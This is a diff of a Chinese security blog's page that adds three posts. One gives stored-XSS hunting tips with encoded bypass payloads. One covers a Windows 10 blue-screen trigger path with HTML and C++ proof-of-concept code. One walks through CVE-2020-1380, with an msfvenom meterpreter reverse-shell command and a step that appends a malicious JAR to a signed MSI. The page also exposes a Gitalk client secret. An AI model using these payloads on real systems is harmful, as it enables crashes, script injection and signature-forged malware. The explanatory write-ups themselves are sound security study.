@@ -66,6 +66,232 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/30/xss/" class="article-date">
+  <time datetime="2021-01-30T08:58:23.000Z" itemprop="datePublished">2021-01-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/30/xss/">存储xss挖掘经验</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#存储xss挖掘经验</p>
+<p>结合这几天挖掘的src xss稍微总结一下存储xss的挖掘经验</p>
+<p>出现位置#<br>一般都是有框就X 例如站内信功能 评论功能等个人喜欢先填写一个<code>&lt;img src=1&gt;</code>看看解析不解析img标签 或者实体编码 进行判断xss的存在，有些厂商一般不会ban img a这种标签，只会ban alert，或者onclick,onload,onerror这种事件属性，</p>
+<p>有些地方会进行一个前台校验输入是否合法 但是后端没有进行判断，例如下图</p>
+<p><img src="https://ma4ter.cn/usr/uploads/2021/01/2365273605.png" alt="enter image description here"></p>
+<p><img src="https://ma4ter.cn/usr/uploads/2021/01/1231273237.png" alt="enter image description here"></p>
+<p>我们就可以在前台输入一个正常的数据例如aaa都可以</p>
+<p>然后抓包修改 就可以进行绕过</p>
+<p>或者还有一些地方有输入长度限制，可以f12修改一下maxlength看看输入payload之后提交后能不能正常的进行保存 如果能进行保存成功的话那就又是前端校验</p>
+<p>或者通过事件进行缩短payload</p>
+<p>#payload的绕过</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html</a></p>
+<p>我觉得这篇文章是一篇不错的总结</p>
+<p>如果输入一个很明显是有害的payload如：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script</code> 之类的可能会将script alert这类危险字符进行一个分割或者加点之类的<img src="https://ma4ter.cn/usr/uploads/2021/01/1148319146.png" alt="enter image description here"></p>
+<p>这里script被分割 无法触发payload<br><img src="https://ma4ter.cn/usr/uploads/2021/01/4028254253.png" alt="enter image description here"></p>
+<p>这里用点进行了分割</p>
+<p>这时候我们可以进行一个编码绕过</p>
+<p>例如<code>&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;/xss/&amp;#41;&gt;aaaa</code></p>
+<p>至于编码绕过上面这篇文章已经总结的很详细了。</p>
+<p><img src="https://ma4ter.cn/usr/uploads/2021/01/4199323161.png" alt="enter image description here"></p>
+<p>#如何触发payload?<br>耐心很重要，例如上面的一个例子 我将自己的姓名修改为xss payload发现并没有解析 差点让我痛失一个中危- -</p>
+<p>后面我发现这个站有评论功能 我奇怪的发现当我随便评论一个东西的时候 他解析了img标签 也就是说评论时是带姓名来评论的 而这里又没有任何的过滤 可以说是形成了一个二次xss吧<br><img src="https://ma4ter.cn/usr/uploads/2021/01/1679945.png" alt="enter image description here"></p>
+<p>接下就只需要将payload替换成弹窗或者引入外部js什么的 就能直接起飞了 因为这个位置没有任何的过滤</p>
+<p>还有一种常见的就是厂商在前台进行了校验 而忽略了后台的校验</p>
+<p>例如 我一般喜欢用两个账号测试xss 一个账号发布 然后另一个账号测试 在评论处输入payload<br><img src="https://ma4ter.cn/usr/uploads/2021/01/843987087.png" alt="enter image description here"><br>是没什么反应的 但是当我进入发布者的后台时候发现弹窗了<br><img src="https://ma4ter.cn/usr/uploads/2021/01/2034371477.png" alt="enter image description here"><br>这样一个存储xss也就到手了</p>
+<p>总之就是多去测试 尽量寻找可能触发payload的地方 遇到实体编码的地方就可以去寻找其他一些可能触发payload的位置</p>
+<p>[转]</p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/01/30/xss/" data-id="ckmm2enp3000bbpcp71uaeelp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-win10蓝屏bug" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/30/win10%E8%93%9D%E5%B1%8Fbug/" class="article-date">
+  <time datetime="2021-01-30T08:14:21.000Z" itemprop="datePublished">2021-01-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/30/win10%E8%93%9D%E5%B1%8Fbug/">win10蓝屏bug</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#win10蓝屏bug<br>最近win10 的蓝屏bug最近很火，在google浏览器中输入：</p>
+<pre> \\.\globalroot\device\condrv\kernelconnect </pre>
+
+
+<p><img src="https://secquan.zzyuncheng.com/e028b8d1549111d870b8c570c002ca18.png-quanzi" alt="enter image description here"></p>
+<p>就会蓝屏，亲测有效；</p>
+<pre>看到吾爱中分析解释说是condrv驱动里的派遣函数CdpDispatchCleanup发生了空指针引用，而后触发了蓝屏。
+因为谷歌浏览器调用了GetFileAttributesExW函数，然后转入ntdll,接着走进了内核，然后调用了condrv的派遣函数。</pre>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;html&gt;<br>&lt;head&gt;<br>&lt;&#x2F;head&gt;<br>&lt;body&gt;&gt;<br>&lt;script&gt;document.location &#x3D; &#39;\\\\.\\globalroot\\device\\condrv\\kernelconnect&#39;;&lt;&#x2F;script&gt;<br>&lt;&#x2F;body&gt;<br>&lt;&#x2F;html&gt;<br><br></code></pre></td></tr></table></figure>
+<p>有师傅分享了代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F; BSOD.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。<br>&#x2F;&#x2F;<br>#include &lt;iostream&gt;<br>#include &lt;Windows.h&gt;<br>int main()<br>&#123;<br>    WCHAR fileName[] &#x3D; L&quot;\\\\.\\globalroot\\device\\condrv\\kernelconnect&quot;;<br>    WIN32_FILE_ATTRIBUTE_DATA data;<br>    GetFileAttributesEx(fileName, GetFileExInfoStandard, &amp;data);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>直接编译成exe文件：</p>
+<p><img src="https://secquan.zzyuncheng.com/aca24da60da6bec2e6a1c31834ddf81e.png-quanzi" alt="enter image description here"></p>
+<p>运行生成的exe文件，成功蓝屏：<br><img src="https://secquan.zzyuncheng.com/9f91f10add04ef39b149d1d65fc32521.png-quanzi" alt="enter image description here"><br>好像没看到可以利用此漏洞来远程执行代码的，希望win10早点修复这个bug呗。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1354077-1-1.html">https://www.52pojie.cn/thread-1354077-1-1.html</a></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2021/01/30/win10%E8%93%9D%E5%B1%8Fbug/" data-id="ckmm2enp10009bpcpfg3k661c" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CVE-2020-1380签名伪造" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/" class="article-date">
+  <time datetime="2020-11-17T10:17:01.000Z" itemprop="datePublished">2020-11-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/">CVE-2020-1380签名伪造</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#CVE-2020-1380签名伪造<br>在之前的文章中，冷逸曾写过一篇《使用CVE-2020-0601进行伪造签名》的文章，里面利用windows其对椭圆曲线的逻辑处理错误，可以为任何程序添加可信的数字签名。而今天介绍的是冷逸另一种更加简单的方法，来添加数字签名，漏洞编号为CVE-2020-1380也称之为GlueBall。利用该漏洞可绕过安全特征，不正确地加载已签名文件。在攻击场景中，攻击者能够绕过旨在阻止加载不正确签名文件的安全特征。<br>我们来看一下这个漏洞，众所周知，在以管理员权限运行时，windows会弹出uac的提示，而拥有数字签名的程序触发uac时，为蓝色.</p>
+<p><img src="https://secquan.zzyuncheng.com/e59bda973de25d94787fd1c12232181d.png-quanzi" alt="enter image description here"></p>
+<p>非数字签名的为黄色</p>
+<p><img src="https://secquan.zzyuncheng.com/0a327fa00c58e34090245139fd3320bc.png-quanzi" alt="enter image description here"></p>
+<p>而众所周知比较常用的数字签名伪造工具sigthief是可以进行签名伪造的，该工具伪造的签名在国内的一些在线测试平台上会显示签名正常，而在VT则会显示无效签名，在系统中也会显示签名无效.</p>
+<p><img src="https://secquan.zzyuncheng.com/cfc440aaff486c259bc4b26aa1a30cae.png-quanzi" alt="enter image description here"></p>
+<p>而利用该漏洞签名的文件，则会显示正常.</p>
+<p><img src="https://secquan.zzyuncheng.com/0c2550e8ec0512b742fbf6e3a5b473ba.png-quanzi" alt="enter image description here"></p>
+<p>注：VT已针对该漏洞进行更新，VT可成功检测该漏洞攻击,会显示invaild-signature</p>
+<p><img src="https://secquan.zzyuncheng.com/06ef06ddfe8717fe272045d0278d4f5d.png-quanzi" alt="enter image description here"></p>
+<p>下面即对该漏洞进行复现，该漏洞的复现过程很简单，准备一个带有数字签名的msi文件，一个恶意的jar文件(可msf生成)，然后合成即可，思路如下.</p>
+<p><img src="https://secquan.zzyuncheng.com/f1422a19bf6d139f14291bd0e07b8256.png-quanzi" alt="enter image description here"></p>
+<pre>msfvenom -p java/meterpreter/reverse_https LHOST=<metasploit host>  LPORT=<metasploit port> -f jar -o xxx.jar</pre>
+
+<p>然后制作文件</p>
+<pre>copy /b xxx.msi + xxx.jar xxx.jar</pre>
+
+<p><img src="https://secquan.zzyuncheng.com/36b3c9ce7d16d69f67d2d214e474551a.png-quanzi" alt="enter image description here"></p>
+<p>成功获取session。其余java编写文件都可以使用该方法进行制作，注：只能为java文件</p>
+<p><img src="https://secquan.zzyuncheng.com/1f6ba02755a7fdfc9e4c498a64b56b49.png-quanzi" alt="enter image description here"></p>
+<p>导致该漏洞的原因为当 Windows 读取 MSI 文件时，它会从文件开头开始读取，一直到有效的 MSI 签名末尾结束并舍弃其它部分。因此在检测到合法的 MSI 文件结构后，它会忽略被附加的数据，而不管它是什么。而JAR 文件只不过是 ZIP 文件，并且在执行时由 Java 运行时从文件末尾开始读取，直到检测到有效 ZIP 文件结构的开头为止，然后它将丢弃文件的其余部分。这最后将造成indows 开始从开头读取而 JAVA 从末尾读取时,windows认为其是一个签名文件，而java文件也可以正常运行。</p>
+<p>现windows已更新了相关补丁，主要为msisip.dll该文件，加入了NeedFileSizeVerification和VerifyFileSize两个逻辑，更新系统即可防止该类攻击。</p>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/smellycat000/article/details/108091187">https://blog.csdn.net/smellycat000/article/details/108091187</a><br><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/24763">https://www.secrss.com/articles/24763</a><br><a target="_blank" rel="noopener" href="https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/">https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/</a><br><a target="_blank" rel="noopener" href="https://www.chainnews.com/zh-hant/articles/041869869233.htm">https://www.chainnews.com/zh-hant/articles/041869869233.htm</a><br><a target="_blank" rel="noopener" href="https://wwws.nightwatchcybersecurity.com/2019/01/16/thoughts-on-the-msi-jar-authenticode-bypass/">https://wwws.nightwatchcybersecurity.com/2019/01/16/thoughts-on-the-msi-jar-authenticode-bypass/</a></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: 'a5bfaa7fddf1c19628f6',
+  clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727',
+  repo: 'renzhonglin.github.io',
+  owner: 'renzhonglin',
+  admin: 'renzhonglin',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://bo.vuvhz.top/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/" data-id="ckmm2enov0001bpcp7jmbcuim" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-httpsms" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/11/17/httpsms/" class="article-date">
@@ -122,7 +348,7 @@ gitalk.render('gitalk-container')
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2020/11/17/httpsms/" data-id="ckm1xdls40006h6cp4qfd978y" class="article-share-link">Share</a>
+      <a data-url="http://bo.vuvhz.top/2020/11/17/httpsms/" data-id="ckmm2enp10008bpcpd0481jvm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -176,7 +402,7 @@ gitalk.render('gitalk-container')
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2020/11/17/cms%E6%BC%8F%E6%B4%9E/" data-id="ckm1xdls20004h6cpgsya9huf" class="article-share-link">Share</a>
+      <a data-url="http://bo.vuvhz.top/2020/11/17/cms%E6%BC%8F%E6%B4%9E/" data-id="ckmm2enoz0006bpcp7p6l3tq6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -230,7 +456,7 @@ gitalk.render('gitalk-container')
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://bo.vuvhz.top/2020/11/17/about/" data-id="ckm1xdls20003h6cpcbr55bh7" class="article-share-link">Share</a>
+      <a data-url="http://bo.vuvhz.top/2020/11/17/about/" data-id="ckmm2enoy0005bpcp2fbohb97" class="article-share-link">Share</a>
       
       
     </footer>
@@ -276,23 +502,23 @@ gitalk.render('gitalk-container')
       <ul>
         
           <li>
+            <a href="/2021/03/23/%E9%80%9A%E8%BE%BEOA/">通达OA_v11.7文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/23/CVE-2021-22986/">CVE-2021-22986复现</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/23/MessageSolution/">MessageSolution邮件bug</a>
+          </li>
+        
+          <li>
             <a href="/2021/03/09/phpstudy%E5%90%8E%E9%97%A8/">phpstudy后门</a>
           </li>
         
           <li>
             <a href="/2021/03/09/%E9%94%90%E6%8D%B7RG-UAC/">锐捷RG-UAC</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/07/%E9%A9%BE%E6%A0%A1%E9%80%9A%E7%BD%91%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/">驾校通网上约车系统漏洞分享</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/07/CVE-2021-21972/">CVE-2021-21972</a>
-          </li>
-        
-          <li>
-            <a href="/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/">通达OAv11.7在线用户登录漏洞</a>
           </li>
         
       </ul>
